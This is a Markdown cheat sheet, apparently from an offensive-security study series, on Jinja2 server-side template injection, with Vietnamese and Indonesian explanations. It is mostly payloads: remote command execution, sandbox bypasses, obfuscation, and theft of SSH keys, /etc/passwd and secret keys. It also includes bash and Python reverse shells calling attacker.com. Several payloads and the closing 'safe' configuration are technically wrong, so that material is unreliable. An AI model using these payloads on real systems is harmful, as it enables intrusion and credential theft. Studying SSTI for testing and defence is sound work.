# 09 - Jinja2 (Python)

## Tổng Quan

**Jinja2** là template engine phổ biến nhất cho Python, được sử dụng trong:

- Flask
- Django (có thể sử dụng Jinja2 thay Django template)
- Ansible
- Salt
- Các ứng dụng Python khác

## Cú Pháp Cơ Bản

```jinja2
{# Comment #}
{{ variable }}              {# Output variable #}
{{ user.name }}            {# Access attribute #}
{{ items[0] }}             {# Access index #}
{{ value | upper }}        {# Apply filter #}
{% if condition %}...{% endif %}
{% for item in items %}...{% endfor %}
{% set var = value %}
```

## Built-in Globals Jinja2

```jinja2
{{ range(5) }}             {# range function #}
{{ dict() }}               {# dict constructor #}
{{ lipsum }}               {# Lorem ipsum generator #}
{{ cycler }}               {# Cycler object #}
{{ joiner }}               {# Joiner object #}
{{ namespace }}            {# Namespace object #}
{{ self }}                 {# Template reference #}
```

## SSTI Payloads - Unsandboxed

### Basic RCE

```jinja2
# Direct __import__
{{ __import__('os').popen('id').read() }}

# System command
{{ __import__('os').system('whoami') }}

# List directory
{{ __import__('os').listdir('/') }}

# Read file
{{ open('/etc/passwd').read() }}
```

### Output Examples

```
Input: {{ __import__('os').popen('whoami').read() }}
Output: www-data

Input: {{ __import__('os').listdir('/') }}
Output: ['bin', 'boot', 'dev', 'etc', 'home', ...]
```

## Jinja2 Sandboxed - Bypass

Jinja2 provide sandbox environment yang menonaktifkan akses berbahaya. Untuk bypass:

### Method 1: Object Introspection

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[396].__init__.__globals__['popen']('id').read() }}
```

**Penjelasan:**

- `''.__class__` → `<class 'str'>`
- `.__mro__[1]` → Akses parent class
- `.__subclasses__()` → List semua subclasses
- `[396]` → Select dangerous class (bervariasi)
- `.__init__.__globals__` → Access module globals
- `['popen']` → Get popen function
- `('id').read()` → Execute command

### Method 2: Via Cycler/Joiner Objects

```jinja2
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.subprocess.call(['whoami']) }}
```

**Why it works:**

- Cycler/Joiner adalah built-in objects yang tidak filtered
- Akses `__init__` dan `__globals__` untuk mendapat module globals
- Dari sini, akses module berbahaya seperti `os`, `subprocess`

### Method 3: Using Filters

```jinja2
{{ lipsum.__class__.__init__.__globals__.os.system('id') }}
{{ lipsum | attr('__class__') | attr('__init__') | attr('__globals__') }}
```

### Method 4: String Attribute Access (Obfuscated)

```jinja2
{%set val='__globals__'%}
{{ cycler.__init__[val].os.system('id') }}
```

## Bypass Filter `{{ }}`

Jika `{{ }}` difilter, gunakan alternatif:

```jinja2
# If-block execution
{% if __import__('os').system('id') %}{% endif %}

# Set statement
{% set x = __import__('os').system('id') %}

# For loop
{% for x in [__import__('os').system('id')] %}{% endfor %}

# Call statement (custom filter)
{% call custom_filter(__import__('os').system('id')) %}{% endcall %}
```

## Data Exfiltration

### File Reading

```jinja2
{{ open('/etc/passwd').read() }}
{{ open('/home/user/.ssh/id_rsa').read() }}
{{ open('/var/www/html/config.php').read() }}
```

### Environment Variables

```jinja2
{{ __import__('os').environ }}
{{ __import__('os').environ['DATABASE_URL'] }}
{{ __import__('os').environ['SECRET_KEY'] }}
```

### Accessing Flask/Django Config

```jinja2
# Flask
{{ config }}              {# If passed to template #}
{{ config.SECRET_KEY }}

# Django
{{ settings.DATABASES }}
{{ settings.SECRET_KEY }}

# Via request
{{ request.app.config }}  {# Flask #}
```

## Reverse Shell

### Bash Reverse Shell

```jinja2
{{ __import__('subprocess').call(['bash','-c','bash -i >& /dev/tcp/attacker.com/4444 0>&1']) }}
```

### Python Reverse Shell

```jinja2
{{ __import__('subprocess').call(['python','-c','import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])']) }}
```

## Obfuscation Techniques

### Unicode/Hex Encoding

```jinja2
{{ __import__('\x6f\x73').system('whoami') }}
{{ __import__('os').__dict__['\x73\x79\x73\x74\x65\x6d']('id') }}
```

### String Concatenation

```jinja2
{{ __import__('o'+'s').system('id') }}
{{ __import__(["os"][0]).system('id') }}
```

### Using getattr

```jinja2
{{ cycler | attr('__init__') | attr('__globals__') }}
```

## Blind SSTI via Time-Based

Ketika output tidak visible:

```jinja2
# Time delay
{{ ''.__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['time'].sleep(5) }}

# Execute and sleep if true
{{ 7*7==49 and __import__('time').sleep(5) }}
```

## Detection Payload

```jinja2
# Basic math
{{ 7*7 }}              → Output: 49

# Object enumeration
{{ self }}             → Enumerate template object

# Built-in access
{{ cycler }}           → If output shown, Jinja2 likely

# Error trigger
{{ undefined_variable }}  → Error message reveals engine
```

## Jinja2 Environment Configuration untuk Mitigation

```python
# ✓ Safe configuration
from jinja2 import Environment, select_autoescape
from jinja2.sandbox import SandboxedEnvironment

# Sandboxed environment
env = SandboxedEnvironment()

# Restricted builtins
env.globals.update({
    '__builtins__': {
        'range': range,
        'len': len,
    }
})

# Pass data as context, never concatenate
template = env.from_string("Hello {{ name }}")
output = template.render(name=user_input)  # SAFE
```

## Tài Liệu Liên Quan

- [04-exploitation-techniques.md](04-exploitation-techniques.md) - Kỹ thuật khai thác
- [06-error-based-technique.md](06-error-based-technique.md) - Error-based
